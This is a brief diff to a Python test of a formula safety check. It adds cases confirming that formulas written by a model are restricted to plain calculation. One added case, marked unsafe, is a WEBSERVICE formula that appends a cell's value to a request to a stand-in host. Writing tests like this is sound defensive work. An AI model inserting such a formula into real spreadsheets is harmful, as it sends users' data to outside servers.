@@ -161,6 +161,9 @@ def test_none_of_the_routing_benchmark_commands_is_taken_for_a_spreadsheet_comma
         ("C2*2", False),
         ("=", False),
         ("=INDIRECT(A1)", False),
+        ('=WEBSERVICE ("http://x.com/?"&A1)', False),
+        ("=MyMacro(A1)", False),
+        ('=ROUND(AVERAGE(B1:B9), 2)&" TL"', True),
     ],
 )
 def test_model_written_formulas_are_limited_to_plain_calculation(formula: str, safe: bool) -> None:
